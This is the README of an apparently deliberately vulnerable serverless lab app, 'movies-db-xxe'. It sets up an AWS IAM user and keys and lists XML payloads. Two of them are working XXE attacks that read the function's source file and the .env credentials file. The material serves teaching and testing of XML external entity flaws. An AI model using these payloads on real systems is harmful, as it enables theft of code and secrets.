# movies-db-xxe

(1) Clone

(2) Run the following commands:

- `aws iam create-user --user-name demo-user`
- `aws iam create-policy --policy-name demo-policy --policy-document '{ "Version": "2012-10-17", "Statement": [ { "Sid": "VisualEditor0", "Effect": "Allow", "Action": [ "s3:ListAllMyBuckets", "s3:ListBucket", "s3:HeadBucket" ], "Resource": "*" }, { "Sid": "VisualEditor1", "Effect": "Allow", "Action": "s3:GetObject", "Resource": [ "arn:aws:s3:::movies.db", "arn:aws:s3:::movies.db/*" ] } ] }'`
- `aws iam attach-user-policy --user-name demo-user --policy-arn 'arn:aws:iam::123123123123:policy/demo-policy'`
- `aws iam create-access-key --user-name demo-user`

(3) Take the SecretAccessKey and AccessKeyId from the output of the create-access-key command and put them inside the  .env 

(4) npm i

(5) sls deploy


## Payloads

- normal:
```<?xml version="1.0"?><movie>Harry Potter</movie>```

- malicious, source code:
```<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY test SYSTEM "/var/task/handler.py">]><movie>&test;</movie>```

- malicious, env keys:
```<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY test SYSTEM ".env">]><movie>&test;</movie>```
